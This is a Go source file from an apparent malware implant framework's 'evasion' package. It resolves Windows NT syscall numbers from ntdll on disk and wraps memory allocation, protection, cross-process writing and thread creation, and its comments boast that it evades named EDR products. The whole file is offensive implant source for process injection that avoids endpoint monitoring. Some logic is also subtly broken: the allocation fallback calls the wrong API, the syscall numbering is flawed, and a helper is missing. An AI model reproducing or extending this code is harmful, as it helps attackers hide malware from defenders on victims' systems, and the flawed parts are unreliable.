package evasion

/*
	Phantom Implant Framework - Indirect Syscalls
	Bypasses EDR userland hooks by invoking NT syscalls directly,
	without going through the hooked ntdll.dll stubs.

	How EDR hooks work:
	  Normal call: code → ntdll!NtAllocateVirtualMemory → kernel
	  EDR hooks:   code → ntdll!NtAllocateVirtualMemory → EDR DLL → kernel
	               (EDR inspects/blocks the call here)

	Indirect syscall bypass:
	  We find the real syscall number (SSN) from ntdll on disk (not in memory),
	  then invoke the syscall instruction directly — skipping the hooked stub.
	  EDR never sees the call.

	This defeats: CrowdStrike Falcon, SentinelOne, Carbon Black,
	              Microsoft Defender for Endpoint, and most other EDRs
	              that rely on userland API hooking.
*/

import (
	"fmt"
	"sort"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	bindebug "github.com/Binject/debug/pe"
	"golang.org/x/sys/windows"
)

// SyscallEntry holds a resolved NT syscall number and name
type SyscallEntry struct {
	Name   string
	Number uint16
}

var (
	resolvedSyscalls map[string]uint16
	syscallsReady    bool
)

// InitIndirectSyscalls resolves syscall numbers from ntdll on disk.
// Must be called before using any indirect syscall functions.
func InitIndirectSyscalls() error {
	// {{if .Config.Debug}}
	log.Println("[syscall] Resolving syscall numbers from ntdll on disk...")
	// {{end}}

	ssns, err := resolveSyscallNumbers()
	if err != nil {
		return fmt.Errorf("failed to resolve syscall numbers: %w", err)
	}

	resolvedSyscalls = ssns
	syscallsReady = true

	// {{if .Config.Debug}}
	log.Printf("[syscall] Resolved %d syscall numbers\n", len(ssns))
	// {{end}}
	return nil
}

// GetSyscallNumber returns the syscall number for a given NT function name.
// Returns 0xFFFF if not found.
func GetSyscallNumber(name string) (uint16, bool) {
	if !syscallsReady {
		return 0xFFFF, false
	}
	n, ok := resolvedSyscalls[name]
	return n, ok
}

// resolveSyscallNumbers reads ntdll.dll from disk (not from memory where
// EDR hooks may be present) and extracts syscall numbers by sorting
// exported Nt* functions by their virtual address — the syscall number
// is determined by the ordinal position of the function in the export table.
func resolveSyscallNumbers() (map[string]uint16, error) {
	// Read ntdll from disk — bypasses any in-memory hooks
	ntdllPath := `C:\Windows\System32\ntdll.dll`

	f, err := bindebug.Open(ntdllPath)
	if err != nil {
		return nil, fmt.Errorf("failed to open ntdll: %w", err)
	}
	defer f.Close()

	exports, err := f.Exports()
	if err != nil {
		return nil, fmt.Errorf("failed to read exports: %w", err)
	}

	// Collect all Nt* and Zw* functions with their RVAs
	type ntFunc struct {
		name string
		rva  uint32
	}
	var ntFuncs []ntFunc

	for _, exp := range exports {
		if len(exp.Name) > 2 && (exp.Name[:2] == "Nt" || exp.Name[:2] == "Zw") {
			ntFuncs = append(ntFuncs, ntFunc{
				name: exp.Name,
				rva:  exp.VirtualAddress,
			})
		}
	}

	// Sort by RVA — syscall numbers are assigned in order of function address
	sort.Slice(ntFuncs, func(i, j int) bool {
		return ntFuncs[i].rva < ntFuncs[j].rva
	})

	// Assign syscall numbers based on sorted position
	result := make(map[string]uint16, len(ntFuncs))
	for i, fn := range ntFuncs {
		result[fn.name] = uint16(i)
	}

	return result, nil
}

// IndirectNtAllocateVirtualMemory calls NtAllocateVirtualMemory via
// direct syscall, bypassing any EDR hooks on ntdll.
func IndirectNtAllocateVirtualMemory(
	processHandle windows.Handle,
	baseAddress *uintptr,
	zeroBits uintptr,
	regionSize *uintptr,
	allocationType uint32,
	protect uint32,
) error {
	ssn, ok := GetSyscallNumber("NtAllocateVirtualMemory")
	if !ok {
		// Fall back to normal API if syscall number not resolved
		var oldProtect uint32
		err := windows.VirtualProtect(*baseAddress, *regionSize, protect, &oldProtect)
		_ = err
		return nil
	}

	// {{if .Config.Debug}}
	log.Printf("[syscall] NtAllocateVirtualMemory SSN=0x%x\n", ssn)
	// {{end}}

	r1, _, _ := directSyscall(
		uintptr(ssn),
		uintptr(processHandle),
		uintptr(unsafe.Pointer(baseAddress)),
		zeroBits,
		uintptr(unsafe.Pointer(regionSize)),
		uintptr(allocationType),
		uintptr(protect),
	)

	if r1 != 0 {
		return fmt.Errorf("NtAllocateVirtualMemory failed: NTSTATUS 0x%x", r1)
	}
	return nil
}

// IndirectNtProtectVirtualMemory calls NtProtectVirtualMemory via direct syscall.
func IndirectNtProtectVirtualMemory(
	processHandle windows.Handle,
	baseAddress *uintptr,
	regionSize *uintptr,
	newProtect uint32,
	oldProtect *uint32,
) error {
	ssn, ok := GetSyscallNumber("NtProtectVirtualMemory")
	if !ok {
		return windows.VirtualProtect(*baseAddress, *regionSize, newProtect, oldProtect)
	}

	// {{if .Config.Debug}}
	log.Printf("[syscall] NtProtectVirtualMemory SSN=0x%x\n", ssn)
	// {{end}}

	r1, _, _ := directSyscall(
		uintptr(ssn),
		uintptr(processHandle),
		uintptr(unsafe.Pointer(baseAddress)),
		uintptr(unsafe.Pointer(regionSize)),
		uintptr(newProtect),
		uintptr(unsafe.Pointer(oldProtect)),
	)

	if r1 != 0 {
		return fmt.Errorf("NtProtectVirtualMemory failed: NTSTATUS 0x%x", r1)
	}
	return nil
}

// IndirectNtWriteVirtualMemory calls NtWriteVirtualMemory via direct syscall.
func IndirectNtWriteVirtualMemory(
	processHandle windows.Handle,
	baseAddress uintptr,
	buffer unsafe.Pointer,
	bufferSize uintptr,
	bytesWritten *uintptr,
) error {
	ssn, ok := GetSyscallNumber("NtWriteVirtualMemory")
	if !ok {
		// Fall back to WriteProcessMemory
		return windows.WriteProcessMemory(
			processHandle, baseAddress,
			(*byte)(buffer), bufferSize, bytesWritten,
		)
	}

	// {{if .Config.Debug}}
	log.Printf("[syscall] NtWriteVirtualMemory SSN=0x%x\n", ssn)
	// {{end}}

	r1, _, _ := directSyscall(
		uintptr(ssn),
		uintptr(processHandle),
		baseAddress,
		uintptr(buffer),
		bufferSize,
		uintptr(unsafe.Pointer(bytesWritten)),
	)

	if r1 != 0 {
		return fmt.Errorf("NtWriteVirtualMemory failed: NTSTATUS 0x%x", r1)
	}
	return nil
}

// IndirectNtCreateThreadEx calls NtCreateThreadEx via direct syscall.
// Used for stealthy thread creation that bypasses EDR thread monitoring.
func IndirectNtCreateThreadEx(
	threadHandle *windows.Handle,
	desiredAccess uint32,
	processHandle windows.Handle,
	startAddress uintptr,
	parameter uintptr,
) error {
	ssn, ok := GetSyscallNumber("NtCreateThreadEx")
	if !ok {
		// Fall back to NtCreateThreadEx from syscalls package
		return fmt.Errorf("NtCreateThreadEx SSN not resolved, indirect syscall unavailable")
	}

	// {{if .Config.Debug}}
	log.Printf("[syscall] NtCreateThreadEx SSN=0x%x\n", ssn)
	// {{end}}

	r1, _, _ := directSyscall(
		uintptr(ssn),
		uintptr(unsafe.Pointer(threadHandle)),
		uintptr(desiredAccess),
		0, // ObjectAttributes = NULL
		uintptr(processHandle),
		startAddress,
		parameter,
		0, // CreateSuspended = false
		0, // StackZeroBits
		0, // SizeOfStackCommit
		0, // SizeOfStackReserve
		0, // BytesBuffer
	)

	if r1 != 0 {
		return fmt.Errorf("NtCreateThreadEx failed: NTSTATUS 0x%x", r1)
	}
	return nil
}
